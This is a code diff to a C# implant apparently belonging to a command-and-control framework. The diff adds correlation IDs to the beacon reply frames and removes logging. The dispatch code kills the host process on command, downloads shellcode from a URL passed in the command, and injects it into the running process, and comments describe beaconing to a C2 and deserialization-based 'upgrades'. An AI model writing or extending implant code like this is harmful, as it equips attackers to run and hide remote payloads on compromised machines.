@@ -39,12 +39,12 @@ namespace CSharpAgent
 
             // OWED REPLY — the upgrade handover. We were deserialized by a 0x0B Upgrade command
             // that the relay already delivered to the JScript agent on this machine; the
-            // requester waiting on the relay's FIFO expects that command's u32 status on the
+            // requester waiting on the relay's FIFO expects that command's status on the
             // NEXT request body this session sends. That next request is OUR first POST, so it
-            // carries 00000000 (chain completed) — the C2's delivery task sees success the
-            // moment we start beaconing. Harmless when we were NOT started by an upgrade (the
-            // relay drops an unsolicited response body with an empty awaiting FIFO).
-            var pending = new List<byte[]> { U32Bytes(0) }; // u32 LE status 0 — the owed reply
+            // carries status 0 + corrId 0 (chain completed; id 0 = unmatched — the command went
+            // to the JScript agent, not us). Harmless when we were NOT started by an upgrade
+            // (the relay drops an unsolicited response body with an empty awaiting FIFO).
+            var pending = new List<byte[]> { Reply(0, 0) }; // [status:u32][corrId:u32] — the owed reply
 
             while (true)
             {
@@ -105,23 +105,25 @@ namespace CSharpAgent
             catch { }
         }
 
-        // Command dispatch. Exit (0x0A) never returns — it kills the host process (and any
+        // Command dispatch. Commands arrive as [opcode][corrId:u32le][payload...] — the id is
+        // echoed in every reply after the status: [status:u32][corrId:u32] (id 0 = unmatched).
+        // Exit (0x0A) never returns — it kills the host process (and any
         // agent injected into it: correct "terminate implant" semantics). UpgradeNative (0x0C)
         // is this breed's ONE capability; everything else — the deserialization UpgradeNetFramework
         // included — replies status 2 (unknown for this breed), mirroring how the JScript
         // agent treats every command but its own.
         private static byte[] Dispatch(byte[] command)
         {
-            if (command.Length == 0) return U32Bytes(2);
+            var corrId = command.Length >= 5 ? BitConverter.ToUInt32(command, 1) : 0;
+            if (command.Length == 0) return Reply(2, 0);
             if (command[0] == 10)
             {
-                Log("exit");
                 Environment.Exit(0);
                 return null; // unreachable — Exit never returns
             }
             if (command[0] == 12)
             {
-                // Payload after the opcode: ASCII `NAME=value` env lines (the same env-line
+                // Payload after the corrId: ASCII `NAME=value` env lines (the same env-line
                 // style the 0x0B headers use). A_URL names the URL we download the PIC agent
                 // bytes from at runtime (C2Payload.Data — the bytes never ride the command);
                 // W_URL is the relay the injected WebSocket agent reads from the process env.
@@ -129,7 +131,7 @@ namespace CSharpAgent
                 // exiting would kill it too.
                 try
                 {
-                    var start = 1;
+                    var start = 5;
                     while (start < command.Length)
                     {
                         var nl = Array.IndexOf(command, (byte)'\n', start);
@@ -143,18 +145,25 @@ namespace CSharpAgent
                         start = nl + 1;
                     }
                     var payload = C2Payload.Data;
-                    if (payload.Length == 0) return U32Bytes(1); // no A_URL ⇒ nothing to inject
+                    if (payload.Length == 0) return Reply(1, corrId); // no A_URL ⇒ nothing to inject
                     ShellcodeRunner.RunPayload(payload);
-                    Log("native upgrade injected (" + payload.Length + " bytes)");
-                    return U32Bytes(0);
+                    return Reply(0, corrId);
                 }
-                catch (Exception e)
+                catch (Exception)
                 {
-                    Log("native upgrade failed: " + e.Message);
-                    return U32Bytes(1);
+                    return Reply(1, corrId);
                 }
             }
-            return U32Bytes(2);
+            return Reply(2, corrId);
+        }
+
+        /// <summary>Build a reply frame: [status:u32le][corrId:u32le].</summary>
+        private static byte[] Reply(uint status, uint corrId)
+        {
+            var frame = new byte[8];
+            BitConverter.GetBytes(status).CopyTo(frame, 0);
+            BitConverter.GetBytes(corrId).CopyTo(frame, 4);
+            return frame;
         }
 
         // One beacon round trip: POST the v3-bin frame stream, return the raw response
